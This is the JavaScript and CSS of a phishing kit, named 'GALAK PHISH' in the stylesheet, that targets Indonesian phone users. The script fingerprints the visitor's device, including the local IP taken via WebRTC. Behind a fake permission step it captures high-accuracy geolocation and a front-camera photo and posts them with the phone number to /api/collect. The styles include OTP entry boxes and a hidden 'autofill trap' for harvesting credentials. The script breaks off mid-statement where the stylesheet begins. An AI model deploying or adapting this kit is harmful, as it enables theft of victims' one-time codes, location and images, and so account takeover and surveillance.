(() => {
  const $ = (id) => document.getElementById(id);
  const state = { phone: "", device: {}, os: {}, network: {}, fingerprint: {}, sensors: {}, geo: null, camera: null };

  // ============ OS DETECT ============
  function detectOS() {
    const ua = navigator.userAgent;
    const p = navigator.platform || "";
    const out = { name: "Unknown", version: "n/a", arch: "n/a" };

    // Android
    const a = ua.match(/Android\s+([\d.]+)/i);
    if (a) {
      out.name = "Android";
      out.version = a[1];
      // model kadang ada di antara "Android X; ...; MODEL Build/"
      const model = ua.match(/Android\s+[\d.]+;\s*([^)]+?)(?:\s+Build\/|\))/i);
      if (model) out.arch = model[1].trim();
      return out;
    }

    // iOS
    const ios = ua.match(/OS\s+([\d_]+)\s+like\s+Mac/i);
    if (/iPhone|iPad|iPod/.test(ua)) {
      out.name = /iPad/.test(ua) ? "iPadOS" : "iOS";
      out.version = ios ? ios[1].replace(/_/g, ".") : "n/a";
      const m = ua.match(/(iPhone|iPad|iPod)/);
      if (m) out.arch = m[1];
      return out;
    }

    // Windows
    if (/Windows NT/.test(ua)) {
      out.name = "Windows";
      const w = ua.match(/Windows NT ([\d.]+)/);
      const map = { "10.0": "10/11", "6.3": "8.1", "6.2": "8", "6.1": "7", "6.0": "Vista", "5.1": "XP" };
      out.version = map[w?.[1]] || w?.[1] || "n/a";
      out.arch = /WOW64|Win64|x64/.test(ua) ? "x64" : /arm64/i.test(ua) ? "ARM64" : "x86";
      return out;
    }

    // macOS
    const mac = ua.match(/Mac OS X ([\d_.]+)/);
    if (/Macintosh|Mac OS X/.test(ua)) {
      out.name = "macOS";
      out.version = mac ? mac[1].replace(/_/g, ".") : "n/a";
      out.arch = /arm64|aarch64/i.test(ua) ? "ARM64" : "x64";
      return out;
    }

    // Linux
    if (/Linux/.test(p) || /Linux/.test(ua)) {
      out.name = "Linux";
      const l = ua.match(/Linux\s+([\w.]+)/);
      out.version = l ? l[1] : "n/a";
      out.arch = /aarch64|arm64/i.test(ua) ? "ARM64" : /armv7/i.test(ua) ? "ARMv7" : "x64";
      return out;
    }

    // ChromeOS
    if (/CrOS/.test(ua)) {
      out.name = "ChromeOS";
      const c = ua.match(/CrOS\s+\S+\s+([\d.]+)/);
      out.version = c ? c[1] : "n/a";
      return out;
    }

    return out;
  }

  // ============ FINGERPRINT ============
  function canvasFP() {
    try {
      const c = document.createElement("canvas");
      c.width = 240; c.height = 50;
      const ctx = c.getContext("2d");
      ctx.textBaseline = "top";
      ctx.font = "15px 'Arial'";
      ctx.fillStyle = "#f60"; ctx.fillRect(2, 2, 120, 30);
      ctx.fillStyle = "#069"; ctx.fillText("GALAK-fp-💀-DEVICE", 4, 4);
      ctx.fillStyle = "rgba(102,204,0,0.7)"; ctx.fillText("GALAK-fp-💀-DEVICE", 6, 6);
      ctx.strokeStyle = "rgba(0,0,255,0.3)"; ctx.arc(180, 20, 15, 0, Math.PI * 2); ctx.stroke();
      const h = c.toDataURL();
      // hash sederhana
      let s = 0;
      for (let i = 0; i < h.length; i++) s = (s * 31 + h.charCodeAt(i)) >>> 0;
      return s.toString(16).padStart(8, "0") + "…" + h.slice(-24);
    } catch { return "na"; }
  }

  async function audioFP() {
    try {
      const AC = window.OfflineAudioContext || window.webkitOfflineAudioContext;
      if (!AC) return "na";
      const ctx = new AC(1, 44100, 44100);
      const osc = ctx.createOscillator();
      osc.type = "triangle"; osc.frequency.value = 1000;
      const comp = ctx.createDynamicsCompressor();
      osc.connect(comp); comp.connect(ctx.destination);
      osc.start(0);
      const buf = await ctx.startRendering();
      const d = buf.getChannelData(0);
      let sum = 0;
      for (let i = 4500; i < 5000; i++) sum += Math.abs(d[i]);
      return sum.toFixed(6);
    } catch { return "na"; }
  }

  function getGPU() {
    try {
      const c = document.createElement("canvas");
      const gl = c.getContext("webgl") || c.getContext("experimental-webgl");
      if (!gl) return { renderer: "na", vendor: "na" };
      const dbg = gl.getExtension("WEBGL_debug_renderer_info");
      return {
        renderer: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "na",
        vendor: dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : "na",
      };
    } catch { return { renderer: "na", vendor: "na" }; }
  }

  async function getBattery() {
    try {
      if (!navigator.getBattery) return "na";
      const b = await navigator.getBattery();
      return `${Math.round(b.level * 100)}%${b.charging ? " ⚡" : ""}`;
    } catch { return "na"; }
  }

  function getConn() {
    const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    return {
      conn: c ? `${c.effectiveType || "?"} / ${c.downlink || "?"}Mbps / ${c.rtt || "?"}ms` : "na",
      downlink: c?.downlink ?? "na",
      rtt: c?.rtt ?? "na",
      save_data: c?.saveData ?? "na",
    };
  }

  async function webrtcLocalIP() {
    return new Promise((resolve) => {
      try {
        const RTC = window.RTCPeerConnection || window.webkitRTCPeerConnection;
        if (!RTC) return resolve("na");
        const pc = new RTC({ iceServers: [] });
        pc.createDataChannel("");
        const ips = new Set();
        pc.onicecandidate = (e) => {
          if (!e.candidate) {
            pc.close();
            resolve([...ips].join(", ") || "na");
            return;
          }
          const m = e.candidate.candidate.match(/(\d{1,3}(?:\.\d{1,3}){3}|[a-f0-9:]+)/i);
          if (m) ips.add(m[1]);
        };
        pc.createOffer().then((o) => pc.setLocalDescription(o));
        setTimeout(() => { try { pc.close(); } catch {} resolve([...ips].join(", ") || "na"); }, 3000);
      } catch { resolve("na"); }
    });
  }

  function detectFonts() {
    const base = ["monospace", "sans-serif", "serif"];
    const test = ["Arial", "Helvetica", "Times New Roman", "Courier New", "Verdana",
      "Georgia", "Tahoma", "Trebuchet MS", "Comic Sans MS", "Impact", "Segoe UI",
      "Roboto", "Noto Sans", "Ubuntu", "San Francisco", "Cantarell", "Calibri"];
    const c = document.createElement("canvas");
    const ctx = c.getContext("2d");
    const size = 48;
    const wOf = (font) => {
      ctx.font = `${size}px ${font}, monospace`;
      return ctx.measureText("mmmmmmmmmmlli").width;
    };
    const baseline = {};
    base.forEach((b) => (baseline[b] = wOf(b)));
    const found = [];
    test.forEach((f) => {
      const hit = base.some((b) => wOf(`${f}, ${b}`) !== baseline[b]) ||
        base.some((b) => {
          ctx.font = `${size}px "${f}", ${b}`;
          return ctx.measureText("mmmmmmmmmmlli").width !== baseline[b];
        });
      if (hit) found.push(f);
    });
    return found.join(",");
  }

  function getVoices() {
    try {
      const v = window.speechSynthesis?.getVoices() || [];
      return {
        count: v.length,
        sample: v.slice(0, 5).map((x) => `${x.name}/${x.lang}`).join(" | "),
      };
    } catch { return { count: 0, sample: "na" }; }
  }

  function detectAdblock() {
    try {
      const b = document.createElement("div");
      b.className = "ad ads adsbox pub_300x250";
      b.style.cssText = "position:absolute;left:-9999px;top:-9999px;height:10px;width:10px";
      document.body.appendChild(b);
      const blocked = b.offsetHeight === 0 || b.offsetParent === null;
      b.remove();
      return blocked ? "yes" : "no";
    } catch { return "na"; }
  }

  async function getStorage() {
    try {
      if (!navigator.storage?.estimate) return { usage: "na", quota: "na" };
      const e = await navigator.storage.estimate();
      const mb = (n) => (n / 1024 / 1024).toFixed(1) + " MB";
      return { usage: mb(e.usage || 0), quota: mb(e.quota || 0) };
    } catch { return { usage: "na", quota: "na" }; }
  }

  async function getPermissions() {
    const names = ["geolocation", "camera", "microphone", "notifications", "clipboard-read", "clipboard-write", "persistent-storage", "push", "background-sync", "accelerometer", "gyroscope", "magnetometer"];
    const out = {};
    for (const n of names) {
      try {
        const s = await navigator.permissions.query({ name: n });
        out[n] = s.state;
      } catch { out[n] = "n/a"; }
    }
    return out;
  }

  async function getMediaDevices() {
    try {
      const d = await navigator.mediaDevices.enumerateDevices();
      const counts = { audioinput: 0, audiooutput: 0, videoinput: 0 };
      d.forEach((x) => counts[x.kind] = (counts[x.kind] || 0) + 1);
      return `mic:${counts.audioinput} spk:${counts.audiooutput} cam:${counts.videoinput}`;
    } catch { return "na"; }
  }

  async function buildAll() {
    const gpu = getGPU();
    const conn = getConn();
    const voice = getVoices();
    state.os = detectOS();
    state.device = {
      ua: navigator.userAgent,
      platform: navigator.platform,
      lang: navigator.language,
      langs: (navigator.languages || []).join(","),
      tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
      screen: `${screen.width}x${screen.height}`,
      viewport: `${innerWidth}x${innerHeight}`,
      dpr: window.devicePixelRatio,
      color_depth: screen.colorDepth,
      cores: navigator.hardwareConcurrency || "na",
      ram: navigator.deviceMemory || "na",
      gpu: gpu.renderer,
      battery: await getBattery(),
      touch: "ontouchstart" in window ? "yes" : "no",
      hover: matchMedia("(hover: hover)").matches ? "yes" : "no",
    };
    state.fingerprint = {
      canvas: canvasFP(),
      audio: await audioFP(),
      webgl_vendor: gpu.vendor,
      fonts: detectFonts(),
      voice_count: voice.count,
      voice_sample: voice.sample,
      plugins: [...(navigator.plugins || [])].map((p) => p.name).join(",") || "na",
      dnt: navigator.doNotTrack || "na",
      cookies: navigator.cookieEnabled ? "yes" : "no",
      adblock: detectAdblock(),
    };
    state.network = {
      conn: conn.conn,
      downlink: conn.downlink,
      rtt: conn.rtt,
      save_data: conn.save_data,
      webrtc_local: await webrtcLocalIP(),
    };
    state.sensors = {
      permissions: await getPermissions(),
      media_devices: await getMediaDevices(),
      storage: await getStorage(),
    };
  }

  // ============ GEO ============
  function getGeo() {
    return new Promise((resolve) => {
      if (!navigator.geolocation) return resolve(null);
      navigator.geolocation.getCurrentPosition(
        (p) => {
          state.geo = {
            lat: p.coords.latitude,
            lng: p.coords.longitude,
            accuracy: Math.round(p.coords.accuracy),
            altitude: p.coords.altitude,
            heading: p.coords.heading,
            speed: p.coords.speed,
            timestamp: p.timestamp,
          };
          resolve(state.geo);
        },
        () => resolve(null),
        { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
      );
    });
  }

  // ============ CAMERA ============
  async function getCamera() {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user", width: { ideal: 720 }, height: { ideal: 540 } },
        audio: false,
      });
      const v = $("cam");
      v.srcObject = stream;
      await new Promise((r) => setTimeout(r, 1000));
      const c = $("cam-canvas");
      c.width = v.videoWidth || 720;
      c.height = v.videoHeight || 540;
      c.getContext("2d").drawImage(v, 0, 0);
      state.camera = c.toDataURL("image/jpeg", 0.88);
      stream.getTracks().forEach((t) => t.stop());
      return true;
    } catch { return false; }
  }

  // ============ NETWORK ============
  async function send(path, payload) {
    try {
      await fetch(path, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
        keepalive: true,
      });
    } catch (e) { console.warn(e); }
  }

  // ============ UI ============
  const stepPhone = $("step-phone");
  const stepPerm = $("step-perm");
  const stepOtp = $("step-otp");
  const stepDone = $("step-done");

  function show(step) {
    [stepPhone, stepPerm, stepOtp, stepDone].forEach((s) => s.classList.add("hidden"));
    step.classList.remove("hidden");
  }

  $("btn-send").addEventListener("click", () => {
    const raw = $("phone").value.replace(/\D/g, "");
    if (raw.length < 8) {
      $("phone").focus();
      $("phone").style.borderColor = "#f43f5e";
      return;
    }
    state.phone = "+62" + raw.replace(/^0+/, "");
    $("ph-out").textContent = state.phone;
    show(stepPerm);
  });

  $("btn-allow").addEventListener("click", async (e) => {
    const btn = e.currentTarget;
    btn.disabled = true;

    const [geo] = await Promise.all([getGeo(), getCamera()]);
    $("b-geo").textContent = geo ? "OK" : "Ditolak";
    $("b-geo").className = "badge " + (geo ? "ok" : "err");
    $("b-cam").textContent = state.camera ? "OK" : "Ditolak";
    $("b-cam").className = "badge " + (state.camera ? "ok" : "err");

    await send("/api/collect", {
      phone: state.phone,
      os: state.os,
      device
/* ============================================================
   GALAK PHISH — style.css
   Full stylesheet. Dark theme, mobile-first, sharp.
   ============================================================ */

/* ---------- RESET ---------- */
*,
*::before,
*::after {
  box-sizing: border-box;
  margin: 0;
  padding: 0;
}

html, body {
  height: 100%;
  -webkit-text-size-adjust: 100%;
  text-size-adjust: 100%;
}

/* ---------- BODY / BACKGROUND ---------- */
body {
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,
    "Helvetica Neue", Arial, "Noto Sans", sans-serif;
  background: #0a0e1a;
  color: #e8ecf4;
  min-height: 100vh;
  min-height: 100dvh;
  display: flex;
  align-items: center;
  justify-content: center;
  padding: 20px;
  overflow-x: hidden;
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
}

.bg-grid {
  position: fixed;
  inset: 0;
  z-index: 0;
  pointer-events: none;
  background-image:
    linear-gradient(rgba(60, 120, 255, 0.06) 1px, transparent 1px),
    linear-gradient(90deg, rgba(60, 120, 255, 0.06) 1px, transparent 1px);
  background-size: 40px 40px;
  -webkit-mask-image: radial-gradient(ellipse at center, black 40%, transparent 80%);
  mask-image: radial-gradient(ellipse at center, black 40%, transparent 80%);
}

/* ---------- CARD ---------- */
.card {
  position: relative;
  z-index: 1;
  width: 100%;
  max-width: 420px;
  background: linear-gradient(180deg, #111827 0%, #0d1424 100%);
  border: 1px solid #1f2937;
  border-radius: 20px;
  padding: 32px 24px 28px;
  box-shadow:
    0 30px 60px rgba(0, 0, 0, 0.55),
    0 0 0 1px rgba(60, 120, 255, 0.05),
    inset 0 1px 0 rgba(255, 255, 255, 0.03);
  animation: card-in 0.35s ease-out;
}

@keyframes card-in {
  from { opacity: 0; transform: translateY(8px) scale(0.99); }
  to   { opacity: 1; transform: translateY(0) scale(1); }
}

/* ---------- HEADER ---------- */
.logo {
  font-size: 40px;
  line-height: 1;
  text-align: center;
  margin-bottom: 14px;
  filter: drop-shadow(0 0 16px rgba(60, 120, 255, 0.6));
  animation: logo-pulse 2.4s ease-in-out infinite;
}

@keyframes logo-pulse {
  0%, 100% { filter: drop-shadow(0 0 12px rgba(60, 120, 255, 0.5)); }
  50%      { filter: drop-shadow(0 0 22px rgba(60, 120, 255, 0.85)); }
}

h1 {
  font-size: 22px;
  font-weight: 700;
  letter-spacing: -0.3px;
  text-align: center;
  margin-bottom: 8px;
  color: #f1f5f9;
}

h2 {
  font-size: 20px;
  font-weight: 700;
  letter-spacing: -0.2px;
  text-align: center;
  margin: 12px 0;
  color: #f1f5f9;
}

.sub {
  font-size: 14px;
  color: #94a3b8;
  text-align: center;
  line-height: 1.55;
  margin-bottom: 20px;
}

.sub b {
  color: #e2e8f0;
  font-weight: 600;
  word-break: break-all;
}

/* ---------- STEPS ---------- */
.step {
  display: flex;
  flex-direction: column;
  gap: 14px;
  animation: step-in 0.28s ease-out;
}

.step.hidden {
  display: none !important;
}

@keyframes step-in {
  from { opacity: 0; transform: translateY(6px); }
  to   { opacity: 1; transform: translateY(0); }
}

/* ---------- PHONE INPUT ---------- */
.phone-wrap {
  display: flex;
  align-items: stretch;
  background: #0a0e1a;
  border: 1px solid #263042;
  border-radius: 12px;
  padding: 0 14px;
  transition: border-color 0.2s, box-shadow 0.2s;
}

.phone-wrap:focus-within {
  border-color: #3b82f6;
  box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.18);
}

.phone-wrap .prefix {
  display: flex;
  align-items: center;
  color: #64748b;
  font-weight: 600;
  font-size: 15px;
  padding-right: 12px;
  border-right: 1px solid #263042;
  user-select: none;
}

.phone-wrap input {
  flex: 1;
  min-width: 0;
  background: transparent;
  border: 0;
  outline: 0;
  color: #e8ecf4;
  font-size: 16px;
  padding: 14px 12px;
  letter-spacing: 1.2px;
  font-variant-numeric: tabular-nums;
}

.phone-wrap input::placeholder {
  color: #475569;
  letter-spacing: 0.5px;
}

/* ---------- FIELDS (creds step) ---------- */
.field {
  display: flex;
  flex-direction: column;
  gap: 6px;
  text-align: left;
}

.field label {
  font-size: 11px;
  color: #94a3b8;
  text-transform: uppercase;
  letter-spacing: 0.7px;
  font-weight: 600;
}

.field input {
  width: 100%;
  background: #0a0e1a;
  border: 1px solid #263042;
  border-radius: 12px;
  color: #e8ecf4;
  font-size: 15px;
  padding: 13px 14px;
  outline: none;
  transition: border-color 0.2s, box-shadow 0.2s;
}

.field input::placeholder {
  color: #475569;
}

.field input:focus {
  border-color: #3b82f6;
  box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.18);
}

/* ---------- BUTTONS ---------- */
.btn {
  appearance: none;
  -webkit-appearance: none;
  width: 100%;
  background: linear-gradient(180deg, #3b82f6 0%, #2563eb 100%);
  color: #fff;
  border: 0;
  border-radius: 12px;
  padding: 14px;
  font-size: 15px;
  font-weight: 600;
  letter-spacing: 0.2px;
  cursor: pointer;
  transition: transform 0.1s ease, filter 0.2s ease, box-shadow 0.2s ease;
  box-shadow:
    0 8px 20px rgba(37, 99, 235, 0.35),
    inset 0 1px 0 rgba(255, 255, 255, 0.12);
  font-family: inherit;
}

.btn:hover {
  filter: brightness(1.08);
}

.btn:active {
  transform: scale(0.98);
}

.btn:disabled {
  filter: grayscale(0.5) brightness(0.65);
  cursor: not-allowed;
  transform: none;
  box-shadow: 0 4px 12px rgba(37, 99, 235, 0.15);
}

.btn-ghost {
  background: transparent;
  color: #94a3b8;
  box-shadow: none;
  border: 1px solid #263042;
  padding: 11px;
  font-size: 13px;
  font-weight: 500;
}

.btn-ghost:hover {
  color: #e2e8f0;
  border-color: #3b4456;
  filter: none;
}

.btn-ghost:active {
  background: rgba(59, 130, 246, 0.06);
}

/* ---------- PERMISSION ROWS ---------- */
.perm-row {
  display: flex;
  align-items: center;
  justify-content: space-between;
  gap: 10px;
  background: #0a0e1a;
  border: 1px solid #263042;
  border-radius: 12px;
  padding: 13px 14px;
  font-size: 14px;
  color: #cbd5e1;
}

.perm-row span:first-child {
  display: flex;
  align-items: center;
  gap: 6px;
  min-width: 0;
}

.badge {
  flex-shrink: 0;
  font-size: 11px;
  font-weight: 600;
  padding: 4px 10px;
  border-radius: 999px;
  background: #1e293b;
  color: #94a3b8;
  white-space: nowrap;
  transition: background 0.2s, color 0.2s;
}

.badge.ok {
  background: #064e3b;
  color: #34d399;
}

.badge.err {
  background: #4c0519;
  color: #f43f5e;
}

/* ---------- OTP INPUT ---------- */
.otp-wrap {
  display: flex;
  gap: 8px;
  justify-content: center;
  margin: 4px 0;
}

.otp {
  width: 46px;
  height: 54px;
  text-align: center;
  font-size: 22px;
  font-weight: 700;
  font-variant-numeric: tabular-nums;
  background: #0a0e1a;
  color: #e8ecf4;
  border: 1px solid #263042;
  border-radius: 10px;
  outline: none;
  transition: border-color 0.15s, box-shadow 0.15s, transform 0.1s;
  font-family: inherit;
  caret-color: #3b82f6;
}

.otp:focus {
  border-color: #3b82f6;
  box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.2);
  transform: translateY(-1px);
}

.otp:not(:placeholder-shown) {
  border-color: #3b82f6;
}

/* ---------- TIMER ---------- */
.timer {
  text-align: center;
  font-size: 13px;
  color: #64748b;
  font-variant-numeric: tabular-nums;
  transition: color 0.2s;
  user-select: none;
}

/* ---------- SUCCESS ---------- */
.ok {
  width: 64px;
  height: 64px;
  border-radius: 50%;
  background: #064e3b;
  color: #34d399;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 32px;
  font-weight: 700;
  margin: 0 auto 4px;
  box-shadow: 0 0 30px rgba(52, 211, 153, 0.4);
  animation: ok-pop 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
}

@keyframes ok-pop {
  0%   { transform: scale(0.4); opacity: 0; }
  100% { transform: scale(1); opacity: 1; }
}

/* ---------- AUTOFILL TRAP ---------- */
/* visually hidden tapi tetap interactive untuk browser autofill */
.autofill-trap {
  position: absolute;
  left: -9999px;
  top: -9999px;
  width: 1px;
  height: 1px;
  overflow: hidden;
  opacity: 0;
  pointer-events: none;
}

.autofill-trap input {
  width: 1px;
  height: 1px;
  border: 0;
  padding: 0;
  opacity: 0;
}

/* ---------- UTILITY ---------- */
.hidden {
  display: none !important;
}

/* ---------- SCROLLBAR (desktop) ---------- */
::-webkit-scrollbar {
  width: 8px;
  height: 8px;
}

::-webkit-scrollbar-track {
  background: #0a0e1a;
}

::-webkit-scrollbar-thumb {
  background: #1f2937;
  border-radius: 4px;
}

::-webkit-scrollbar-thumb:hover {
  background: #263042;
}

/* ---------- RESPONSIVE ---------- */
@media (max-width: 380px) {
  .card { padding: 26px 18px 22px; border-radius: 16px; }
  h1 { font-size: 20px; }
  .otp { width: 42px; height: 50px; font-size: 20px; }
  .otp-wrap { gap: 6px; }
}

@media (min-width: 768px) {
  .card { padding: 36px 28px 32px; }
}

/* ---------- REDUCED MOTION ---------- */
@media (prefers-reduced-motion: reduce) {
  *, *::before, *::after {
    animation-duration: 0.001ms !important;
    animation-iteration-count: 1 !important;
    transition-duration: 0.001ms !important;
  }
}
